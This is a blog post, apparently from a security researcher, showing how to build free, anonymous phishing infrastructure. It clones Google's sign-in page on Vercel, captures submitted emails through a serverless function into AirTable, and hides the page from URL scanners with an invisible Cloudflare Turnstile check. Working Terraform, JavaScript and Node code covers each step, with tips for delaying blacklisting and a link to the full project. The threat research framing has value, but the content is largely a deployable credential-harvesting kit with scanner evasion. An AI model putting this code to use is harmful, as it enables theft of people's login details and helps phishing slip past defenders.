---
layout: post
title: "Abusing the cloud: poor man's phishing infrastructure" 
subtitle: ""
author: TTP Report
categories: phishing
images_path: /assets/images/posts/2023-09-18-abusing-cloud-poor-man-phishing
banner:
  image: /assets/images/posts/2023-09-18-abusing-cloud-poor-man-phishing/banner.png
image: /assets/images/posts/2023-09-18-abusing-cloud-poor-man-phishing/banner.png
tags: T1583 T1566 cloud terraform phishing
new: 1
sidebar: []
---

There are numerous threat intel reports mentioning abuse of public cloud infrastructure by different groups and individuals. What I want to explore here is how viable this is today and, most importantly, can I do it absolutely anonymously and spending exactly 0 money.
In this writeup I'll focus on building simple phishing infrastructure. 

Preferably, in a way that's easy to use and to scale while evading blacklisting by the Good Guys, like real big pp hackers supposed to do.

## TL;DR

A few services from Vercel, Cloudflare and AirTable can be used as a free and anonymous way to serve phishing pages. Besides these, there are a ton of providers with similar abusable offerings. [My Terraform for this demo](https://github.com/ttpreport/cloud-phishing) is a non-convergent shit, full of bad practices, but it works.

## Planning
Let's start with writing down building blocks that this thing requires:
* Frontend to store and display this page
* Backend to process the submissions
* Protection from scanners and AVs
* UI to analyze the results
* Automated as much as possible

Ideally, I want to decouple everything to make my infra more versatile - I'd want to run different campaigns easily, scale as needed and swap out pieces that get blacklisted.

While frontend can be anything from static page hosting to a simple object storage, backend could be a little more tricky, but considering that I don't need much business logic, there should be multiple options out there. Data storage might be tricky as well.

In terms of evasion I can't rely on trying to obfuscate the page contents from the scanners as it will couple evasion and the frontend too much, which will be a pain in the ass to maintain in the long run.

UI is something that has to be 100% SaaS - I don't want to waste any time coding this.

For automation, I'll obviously leverage Terraform. Of course, Terraform is about infrastructure only and for content provisioning I'd need other tools, but I'm trying to keep this easy to digest, so I'll be doing ugly things with Terraform only. So, reader discretion is advised.

## Frontend
For the phishing page itself, I'll be using the first screen of Google's sign in page. Thanks to CodePen, it's just a matter of a quick search. So, here it is, courtesy of [Hasanrza](https://codepen.io/Hasanrza/pen/wvRJBeK):
![Phishing page]({{ page.images_path }}/1.png)
It looks almost identical to the original and there are enough triggering keywords for the scanners, so I'll be able to evaluate the quality of the evasion techniques later on.

Now, to serve this thing to the public I have multiple options: different object storage providers, different flavors of static website hostings, hell, I can even just publish it on GitHub Pages. The first round of shortlisting is easy, I need something that officially supports Terraform - I want to avoid being compromised myself, but don't want to do the code review of community providers. Next, I need it to be both free and anonymous (no credits cards or something), so the usual AWS, GCP and Azure aren't an option. Thankfully, there are still tons of providers left, and with proliferation of "cloud platforms as a service" in the recent years, the list is only getting bigger by the day.

Long story short, I settled on [Vercel](https://vercel.com/). Let's deploy my phishing page:

```terraform
resource "vercel_project" "phish_frontend" {
  name      = "phish-frontend"
}

data "vercel_project_directory" "phish_frontend" {
  path = "./frontend"
}

resource "vercel_deployment" "phish_frontend" {
  project_id  = vercel_project.phish_frontend.id
  files       = data.vercel_project_directory.phish_frontend.files
  path_prefix = "frontend"
  production  = true
}
```

Basically, it just takes specified folder and uploads it to the cloud, then serves it as a static website. Which makes it possible to employ dirty Terraform techniques later on to avoid separate provisioning with some other tool. But I'll settle with a basic setup for now.

## Backend
Arguably the hardest piece here is the backend, because nobody in their right mind will give you a completely anonymous and free full-blown compute. Based on threat intel reports, in similar campaigns, most threat actors use previously compromised servers to host their processing scripts. It's easy enough, but I think it's a very brittle approach, because you don't know when your backend will get detected and taken down, and with tons of unusual traffic, it will probably be very soon.

The thing is, I don't really need anything complex, I just need something minimal that can catch the form submission and pass it somewhere for storage. This is where serverless compute comes very handy - it's cheap and simple enough for providers to give it out at free tier.
There a different types of such services: edge compute, serverless functions, workers - whatever you call them, they are basically just stateless one-shot apps, which is exactly what I need.

I decided to not overcomplicate things and use Vercel again as they provide serverless compute as well:

```terraform
resource "vercel_project" "phish_backend" {
  name      = "phish-backend"
}

data "vercel_project_directory" "phish_backend" {
  path = "./backend"
}

resource "vercel_deployment" "phish_backend" {
  project_id  = vercel_project.phish_backend.id
  files       = data.vercel_project_directory.phish_backend.files
  path_prefix = "backend"
  production  = true
}
```

The idea here is the same as with frontend, but for the backend they require to upload to an `/api/` folder and describe the function in a language it supports, like this:

```javascript
export default function handler(request, response) {
	const { name = 'World' } = request.query; 
	return response.send(`Hello ${name}!`);
}
```

And here is the frontend part, that will submit the form:

```js
function onSubmit(e) {
    e.preventDefault();
    const request = new XMLHttpRequest();
    request.open("POST", "//${domain}/api/process", false);
    request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')
    request.send("email="+e.target.elements.email.value);
    window.location.replace(
        "https://example.com/",
    );
}
```

## Evasion
Now that I have basic frontend and backend kind of functioning, it's a good point to switch to figuring out evasion.

Funny enough, I couldn't really use popular URL scanners like VirusTotal, because AVs aren't doing any live analysis of the page itself - they just check a blacklist. Another fun insight is that multiple fresh (public) tools, claiming to utilize complex AI, ML or whatever else is hype, couldn't find anything suspicious in my page. I'm not going to shame any specific service, but let's just say that I could only find 2 that were able to spot the problem:
* [STO Scan](https://scan.safetoopen.com/)
![Initial STO Scan]({{ page.images_path }}/2.png)

* [urlscan.io](https://urlscan.io/)
![Initial urlscan.io]({{ page.images_path }}/3.png)

With such results, the potential campaign will hit the blacklist almost instantly, which is not good. For the reasons I mentioned before, I don't really want to mess with the page itself, so I could use the more popular approach like use one of the fingerprinting libraries like [BotD](https://github.com/fingerprintjs/BotD) to detect bots, but in my experience these aren't reliable when it comes to AVs and threat scanners.

I was considering using one of the CAPTCHA engines - they get the job done, but it doesn't look good, even if I target very inexperienced people. And then, while googling about different CAPTCHAs, I learned that Cloudflare relatively recently released a new non-interactive alternative - [Turnstile](https://blog.cloudflare.com/turnstile-private-captcha-alternative/), which turned out to be a fantastic and easy way to do evasion.

Thankfully, Cloudflare's free tier is anonymous and Turnstile is included. So, let's spin it up:

```terraform
resource "cloudflare_turnstile_widget" "phish_turnstile" {
  account_id     = var.cloudflare_account_id 
  name           = "My widget"
  domains        = [ "vercel.app" ]
  mode           = "invisible"
}
```

Now, the idea is simple: if the client can provide correct proof-of-work, I'll show them the phishing page, otherwise I consider them a bot and show something benign. For this I'll need backend as well.

My new frontend looks like this now:

```html
<html>
    <head>
        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" defer></script>
        </head>
        <body>
            <div id="container" style="display:none"></div>
            <script src="/turnstile.js"></script>
            <noscript>UNDER CONSTRUCTION</noscript>
        </body>
</html>
```

All the magic is inside `turnstile.js`:

```js
window.onloadTurnstileCallback = function () {
    turnstile.render('#container', {
        sitekey: '${sitekey}',
        callback: function(token) {
            const request = new XMLHttpRequest();
            request.open("POST", "//${domain}/api/protect", false);
            request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')
            request.send("token="+token);
            document.write(request.responseText);
        },
    });
};
```

It will dynamically serve the content, based on Turnstile's evaluation. Most importantly, it has nothing that would trigger external scanners.

On the backend, it takes the token, which user computed locally and sends it to Cloudflare for validation:

```node
import { readFileSync } from 'fs';
import path from 'path';

const SECRET_KEY = '${secret}';

export default async (request, response) => {
    response.setHeader('Access-Control-Allow-Origin', '*')
    response.setHeader('Access-Control-Allow-Methods', 'OPTIONS, POST')
    
    if (request.method === 'OPTIONS') {
        return response.status(200).end();
    }

    const { token } = request.body;
	const ip = request.headers['x-forwarded-for'];
    
    let formData = new FormData();
    formData.append('secret', SECRET_KEY);
    formData.append('response', token);
    formData.append('remoteip', ip);

    try {
        const cf_response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            body: formData,
            method: 'POST',
        });

        const outcome = await cf_response.json()
        if (outcome.success) {
            const page = path.join(process.cwd(), 'data', 'phish.tpl');
            return response.send(readFileSync(page, 'utf8'));
        } else {
            return response.send('UNDER CONSTRUCTION');
        }
    } catch(err) {
        return response.send("UNDER CONSTRUCTION");
    }
}
```

If Cloudflare says that it's okay, then I can assume that this is human and return phishing page contents, which the frontend script will render, otherwise it will just say "UNDER CONSTRUCTION".

So, with everything set up, let's see what the scanners have to say:

STO Scan:
![Final STO Scan]({{ page.images_path }}/4.png)

urlscan.io:
![Final urlscan.io]({{ page.images_path }}/5.png)

Looks like they don't evaluate JS deep enough as I don't see "UNDER CONSTRUCTION" on their screenshots. Welp, I guess private threat scanners are a bit smarter and hopefully my thing will fool them as well. I don't have access to any of them at the moment, so who knows. In any case, it bypassed everything I had at hand, which is good enough.

This does not protect from "Safe Browsing" features, that are built into the modern browsers as they see everything client-side, including content hidden dynamic rendering. It will definitely flag the page sooner or later, but that's mostly out of scope of this project. Just a small pro tip: avoid using recognizable input names in the forms to decrease the chance of automated flagging and delay blacklisting.

## UI
Initially, I thought that would be on par with backend in terms of amount of pain the ass, because databases aren't usually something providers give out for free. I was considering different hacks like storing data in some object storage or edge KV cache, but after a closer look, it turned out to be the easiest part.

There are tons of SaaS platforms for data analysis and aggregation that have free tier with no strings attached. The only thing I need from it is API for data manipulation, which is kind of given in these things. So, I just took the first one Google spat out and it happened to be [AirTable](https://www.airtable.com/).

This is the only thing I didn't bother to automatically provision, because I'd need to set it up only once (hopefully) and use it for all campaigns.

Quite straightforward - I created an empty table "submissions" with 2 columns: "email" and "created_at". Latter will be populated automatically. I just need an access token to access the API and then finally provision my backend:

```node
const AIRTABLE_KEY = '${key}';
const AIRTABLE_ID = '${id}';
const AIRTABLE_TABLE = '${table}';

export default async (request, response) => {
    response.setHeader('Access-Control-Allow-Origin', '*')
    response.setHeader('Access-Control-Allow-Methods', 'OPTIONS, POST')
    
    if (request.method === 'OPTIONS') {
        return response.status(200).end();
    }

    const { email } = request.body;

    try {
        const cf_response = await fetch('https://api.airtable.com/v0/'+AIRTABLE_ID+'/'+AIRTABLE_TABLE, {
            body: JSON.stringify({
                "records": [
                  {
                    "fields": {
                      "email": email
                    }
                  }
                ]
              }),
            method: 'POST',
            headers: {
                "Authorization": "Bearer " + AIRTABLE_KEY,
                "Content-Type": "application/json",
            },
        });

        await cf_response.json();
        return response.send("OK");
    } catch(err) {
        return response.send("ERROR");
    }
}
```

And that's it for the UI. You can click around the interface there to create whatever dashboard you need, but I'll settle for a default grid view for this demo.

Going through the whole flow and submitting my data, everything seem to fall into place and the dashboard is properly populated in real time:

![Final urlscan.io]({{ page.images_path }}/6.gif)


## Conclusion
After all is said and done, complete flow looks like this:

![Final urlscan.io]({{ page.images_path }}/7.png)

As you can see, all of that was remarkably trivial to set up and I've never went over my budget of 0 coins. Looks like, generous marketing offers by the cloud providers are an absolute goldmine, if you are creative enough.

Obviously, this is just a small demo with multiple things intentionally left out. And for the sake of simplicity I did both content and infra provisioning via Terraform, which made it non-convergent and full of bad practices. So, as always, play around at your own risk.

Also, this thing is limited by different free tier confines: serverless functions will only have so much free runs or compute minutes available, domains are pretty ugly and telling, the UI/storage thing is not unlimited too, etc. 

Even with all of that in mind and in its current barebones state, this thing could be a quite dangerous tool, if (ab)used correctly.

You can find [complete project code on GitHub](https://github.com/ttpreport/cloud-phishing).